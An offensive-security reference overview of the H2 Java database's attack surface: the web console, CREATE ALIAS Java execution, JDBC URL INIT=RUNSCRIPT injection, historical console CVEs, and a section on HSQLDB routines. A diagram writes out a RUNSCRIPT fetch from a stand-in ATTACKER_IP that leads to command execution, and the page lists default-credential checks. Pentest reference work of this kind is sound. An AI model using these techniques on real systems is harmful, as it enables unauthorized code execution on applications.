---
technology: "H2 Database"
kind: overview
audience: offensive-security
family: databases
layer: "Java SQL database: embedded/in-memory engine + TCP server (9092) + web console (8082), SQL-to-Java bridge (CREATE ALIAS / CREATE TRIGGER, INIT=RUNSCRIPT)"
language: Java
first-released: 2005 (by Thomas Mueller, original author of Hypersonic SQL)
license: "EPL 1.0 / MPL 2.0 dual license"
homepage: "https://www.h2database.com"
github-repo: "https://github.com/h2database/h2database"
evidence: "zero corpus evidence by design — upstream-only new unit (bucket-2, owner-approved)"
status: upstream-only
source: "rewritten from HackTricks (src/network-services-pentesting/pentesting-web/h2-java-sql-database.md; src/network-services-pentesting/9001-pentesting-hsqldb.md), CC BY-NC 4.0, accessed 2026-11-13"
provenance: "upstream-only: zero corpus evidence by design (new-unit bucket-2; content built from the upstream reference plus primary advisories, not from the writeup corpus). Upstream-verified 2026-11-13: NVD + GHSA-h376-j262-vhq6 for CVE-2021-42392 (org.h2.util.JdbcUtils.getConnection JNDI driver/URL RCE, H2 1.1.100–2.0.204, console vector unauthenticated); NVD record for CVE-2022-23221 (H2 Console before 2.1.210, jdbc:h2:mem URL with IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT substring, explicitly a different bug than CVE-2021-42392); OSV/GHSA-xm2m-2q6h-22jw for CVE-2023-34468 (Apache NiFi 0.0.2–1.21.0 DBCPConnectionPool/HikariCPConnectionPool H2 URL code injection, 1.22.0 validates and rejects). Trap checked: CVE-2021-42342 is a GoAhead CGI issue, NOT an H2 CVE. Rewritten from HackTricks (src/network-services-pentesting/pentesting-web/h2-java-sql-database.md; src/network-services-pentesting/9001-pentesting-hsqldb.md as the HSQLDB section), CC BY-NC 4.0, accessed 2026-11-13."
---

# H2 Database

> A SQL engine that lives inside the application's own JVM — so any SQL execution you can reach is a candidate for Java method invocation (`CREATE ALIAS`), and any JDBC URL you can influence is a candidate for `RUNSCRIPT`-from-your-HTTP-server at connect time. Pre-2022 the bundled web console was itself an unauthenticated RCE.

## What it is

H2 is a small, fast relational database written in Java, created by Thomas Mueller (the original Hypersonic SQL author — HSQLDB's ancestor) and dual-licensed EPL/MPL. It runs embedded (inside the application process, `jdbc:h2:mem:...` or file-backed), as a TCP server, and ships a browser **H2 Console**. That ubiquity is the engagement story: H2 is the database applications use when nobody provisioned a database — Spring Boot demos, test harnesses, tool defaults, and bundled app stores (Apache NiFi's flow/configuration storage, Metabase's application DB in older releases).

The operator's mental model: **H2 is a SQL-to-JVM bridge**. Its alias and trigger language can bind or compile Java (`CREATE ALIAS ... AS $$ Java source $$`, or a `CLASSPATH:` method reference), the `INIT=` connection setting executes SQL the moment a connection opens, and `RUNSCRIPT FROM` can pull that SQL from an attacker-controlled URL. So three doors lead to the same room: the console login form (historically exploitable unauthenticated — CVE-2021-42392 JNDI via `org.h2.util.JdbcUtils.getConnection`, CVE-2022-23221 `INIT=RUNSCRIPT` variant), SQL execution through the application (SQL injection or an app feature), and **JDBC URL influence** (a connection-pool config page or an API that stores connection details — the NiFi CVE-2023-34468 pattern, and Metabase's 2023 pre-auth chain).

The takeaway: an H2 you can talk to is usually one config mistake away from code execution *in the application's JVM*, with the application's privileges. Modern H2 (2.x) tightened defaults — creating a database over the console/server remotely is disabled unless explicitly enabled — but old 1.4.x jars embedded in packaged apps are everywhere.

## The anatomy that matters on an engagement

    console form / app SQL / JDBC-URL field
        │  (creds: sa + empty on a fresh DB; console "connects to anything" with known JDBC URL + creds)
        ▼
    H2 engine ── INIT=RUNSCRIPT FROM 'http://ATTACKER_IP/x.sql'   ← SQL at connect, script from you
        │
        ▼
    CREATE ALIAS / CREATE TRIGGER ── compiles Java source at runtime or binds a classpath method
        │
        ▼
    Runtime.getRuntime().exec(...) inside the target JVM

Structural properties that drive findings:

1. **Aliases are Java.** With SQL rights you define a function whose body is Java source (compiled in-process via `javax.tools`) or a static method by name — the engine executes it when the alias is called. SQL execution equals JVM code execution unless hardening removed it.
2. **The connection URL is executable configuration.** `INIT=` runs at every new connection; `RUNSCRIPT FROM` fetches a script over HTTP/SMB. Any surface that lets you edit the JDBC URL is a code-exec surface, gated only by the target being forced to open a *new* connection.
3. **The console is both a target and a client.** Point it at an existing database (its own or another engine via JDBC URL + known creds) and it becomes your SQL browser post-compromise. Fresh embedded databases make the *supplied* user the administrator; historically `sa` with an empty password. Remote creation through the console/server is off by default in current versions — an old install that allows it is the finding.

## Where you'll meet it

- **Spring Boot / Java web apps with dev profiles left on** — `spring.h2.console.enabled=true` on a staging box promoted to production; the console path (`/h2-console`) is a free login form.
- **Packaged applications bundling H2 as their store** — NiFi (flow config, CVE-2023-34468), Metabase application DBs (the 2023 pre-auth chain, CVE-2023-38646, went through connection-details injection into an H2 trigger), various JetBrains-era and reporting tools.
- **Test/QA estates** — in-memory H2 in CI-built artifacts that kept the debug surface on; the jar on a classpath is invisible until an error page or a config file names `org.h2.Driver`.
- Thin coverage: nobody monitors the H2 console the way they watch Postgres — finding one is usually finding an unowned surface.

## Reading the framework's mind

1. A connection to an embedded URL for a **nonexistent database creates it**, and the user you supplied becomes its administrator (upstream-documented). Older consoles let this happen remotely; current versions disable remote creation by default.
2. `sa` with an empty password is the classic fresh-database login — a configuration check, not a guarantee; packaged apps usually set their own.
3. `INIT=` executes when a connection *opens* — pools cache connections, so URL-injection payloads need a forced reconnect (see [[h2-database-bug-bounty|methodology]]).
4. `CREATE ALIAS` bodies are Java compiled at runtime; older 1.x lines also accepted a `//javascript` source header (Nashorn) in alias/trigger bodies, removed in the 2.x rework.
5. The console RCE history is version-gated and well-mapped: CVE-2021-42392 (1.1.100–2.0.204, JNDI driver-class + LDAP/RMI URL through `JdbcUtils.getConnection`, unauthenticated through the console) and CVE-2022-23221 (before 2.1.210, `INIT=RUNSCRIPT` substring in a `jdbc:h2:mem` URL) — see [[h2-database-bug-bounty|methodology]] for gates and degradation on modern JDKs.

## HSQLDB — same family, same door (section)

**HSQLDB (HyperSQL)** is H2's direct sibling (Mueller's Hypersonic SQL lineage continued by the HSQLDB project): a Java RDBMS with in-memory, disk, embedded and server modes, default TCP port **9001** when a server is actually started. In practice it is usually found in-memory or bound to localhost — reaching it on the network typically means you already compromised something and are escalating. Fresh databases historically create the administrator `SA` with an **empty password** (packaged apps commonly change it — treat `sa`/blank as a config check, not a network default). Post-exploitation, grep application configs for `jdbc:hsqldb:...;password`-style strings to recover the real credentials and database name.

Its SQL-to-Java door is **Java Language Routines (JRTs)**: `CREATE FUNCTION ... LANGUAGE JAVA EXTERNAL NAME 'CLASSPATH:...'` binds any static method visible to the engine's class loader (an `hsqldb.method_class_names` allowlist can restrict this). A method returning a value is a function called via `VALUES`; a void method is a procedure called via `CALL`. Gadgets and workflow live in the methodology page.

## Where to go next

- [[h2-database-bug-bounty|h2-database bug bounty methodology]] — console access, CVE gates, the alias payloads, JDBC-URL injection workflow, and the HSQLDB routine gadgets.
- Related JVM-surface units: [[java-deserialization]], [[java-rmi]], [[spring-boot]].
